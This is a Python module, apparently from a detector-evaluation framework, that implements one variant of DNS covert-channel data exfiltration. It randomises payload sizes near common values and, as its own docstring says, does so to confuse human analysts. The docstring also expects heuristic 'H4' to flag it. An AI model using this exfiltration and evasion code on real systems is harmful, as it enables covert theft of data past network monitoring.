#!/usr/bin/env python3
"""
T4-variant R3 — Variacao em torno de canonicos com perturbacao +/-10.

ups = sorteio_canonico + uniform(-10, +10), onde sorteio_canonico in
{512, 1232, 1452, 4096} a cada query.

Razao de unicidade esperada: ~1.0 (cada query gera ups distinto com
alta probabilidade dado que perturbacao em [-10,+10] tem 21 valores
possiveis). H4 deve disparar.

Caracteristica adversarial: ups proximo a valores canonicos pode
confundir analise visual humana, mas pelo metrica de unicidade nao
muda comportamento.
"""

import random
from techniques.t4_variant_base import exfiltrate, payload_to_n_queries


CANONICAL_BASES = [512, 1232, 1452, 4096]


def gen_ups_sequence(n_queries: int) -> list:
    seq = []
    for _ in range(n_queries):
        base = random.choice(CANONICAL_BASES)
        perturb = random.randint(-10, 10)
        seq.append(base + perturb)
    return seq


def exfiltrate_bytes(data: bytes, domain: str,
                     dns_server: str,
                     src_port: int = None,
                     interval: float = 0.04,
                     jitter: float = 0.02) -> int:
    if src_port is None:
        src_port = random.randint(10000, 60000)
    n = payload_to_n_queries(len(data))
    seq = gen_ups_sequence(n)
    return exfiltrate(seq, domain, dns_server, src_port,
                      interval=interval, jitter=jitter)
